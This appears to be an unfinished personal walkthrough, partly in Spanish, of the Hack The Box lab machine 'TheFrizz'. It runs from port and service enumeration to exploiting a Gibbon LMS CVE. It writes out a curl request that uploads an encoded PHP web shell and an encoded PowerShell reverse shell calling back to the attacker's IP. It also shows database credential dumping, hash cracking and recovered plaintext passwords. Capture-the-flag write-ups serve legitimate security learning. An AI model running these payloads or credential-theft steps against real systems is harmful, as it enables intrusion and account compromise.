---
title: TheFrizz
draft: true
tags:
---
Machine: https://app.hackthebox.com/competitive/7/overview

---
# Enumeration
## Port Scaning
- Using [[content/Tools/Activas/3. Escaneo de puertos/nmap|nmap]] in order to get the service and versions running in each port
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.60
nmap -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sCV --min-rate 5000 -n -Pn -vvv 10.10.11.60 -oN Targeted -oX Targeted.xml
```
>[!example]- Result
>![[Pasted image 20250319143456.png]]

Domain: `frizz.htb`
hostname: `FRIZZDC`
## DNS
- Using [[dig]] we can perform a DNS transfer but doesnt work
```bash
dig axfr 10.10.11.60
```

## LDAP
- We cant enumerate using ldap protocol because null session is not enabled
```bash
ldapsearch -H ldap://10.10.11.60 -x -s base
ldapsearch -H ldap://10.10.11.60 -x -b 'DC=frizz,DC=htb'
```
>[!example]- Result
>![[Pasted image 20250319144454.png]]

## SMB
- As null session is desabled we can do nothing
```bash
crackmapexec smb 10.10.11.60 -u '' -p ''
```
>[!example]- Result
>![[Pasted image 20250319144806.png]]

## Kerberos
- We can enumerate valid usernames using [[kerbrute]], we dont find nothing interesting
```bash
kerbrute_linux_amd64 userenum --dc frizz.htb -d frizz.htb /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
```
>[!example]- Result
>![[Pasted image 20250319145902.png]]

## HTTP
- Getting technologies running using [[wappanalyzer]] and [[whatweb]]
```bash
whatweb http://frizzdc.frizz.htb
```
>[!example]- Result
>![[Pasted image 20250319150127.png]]
>![[Pasted image 20250319150223.png]]

- Checking the web side we can see the version of the platform, and is vulnerable to LFI: [CVE-2023-34598](https://github.com/Zer0F8th/CVE-2023-34598)
>[!example]- Result
>![[Pasted image 20250319153416.png]]

- we can check if this web is vulnerable researching this file `gibbon.sql`
>[!example]- Result
>![[Pasted image 20250319153956.png]]

- lets try this PoC
```bash
python3 CVE-2023-34598.py scan http://frizzdc.frizz.htb/Gibbon-LMS/
```
>[!example]- Result
>![[Pasted image 20250319154112.png]]








----
subir la revershell
```bash
curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \
-H "Host: frizzdc.frizz.htb" \
--data-urlencode "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" \
--data-urlencode "path=shell.php" \
--data-urlencode "gibbonPersonID=0000000001"
```

mandar revershell
![[Pasted image 20250319173607.png]]
`http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D`



configuracion 
![[Pasted image 20250319173729.png]]

```
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

Leer base de datos
```shell
.\mysql.exe -h localhost -u MrGibbonsDB "-pMisterGibbs!Parrot!?1" -Bse "show databases;use gibbon;show tables;show columns from gibbonPerson;SELECT * FROM gibbonPerson;"
```

`f.frizzle@frizz.htb:f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489`
![[Pasted image 20250319180619.png]]

crack
`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489`
```bash
hashcat -m 1420 f.frizzleHash /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20250319181501.png]]
`Jenni_Luvs_Magic23`

Ahora por [[evil-winrm]] pero no va
```
evil-winrm -i 10.10.11.60 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'
```

- metodo 1 con el CVE `https://www.exploit-db.com/exploits/51903`
```bash
python3 exploit.py 10.10.11.60 80/Gibbon-LMS/ f.frizzle@frizz.htb Jenni_Luvs_Magic23 'whoami'
```
![[Pasted image 20250319182500.png]]

- con el [[impacket-getTGT]]
```bash
sudo ntpdate -s 10.10.11.60
impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23
export KRB5CCNAME=f.frizzle.ccache
```

ahora cone ste usuario podemos que en la papelera de reciclaje hay cosas
\




```
f.frizzle:Jenni_Luvs_Magic23
m.schoolbus:!suBcig@MehTed!R 
```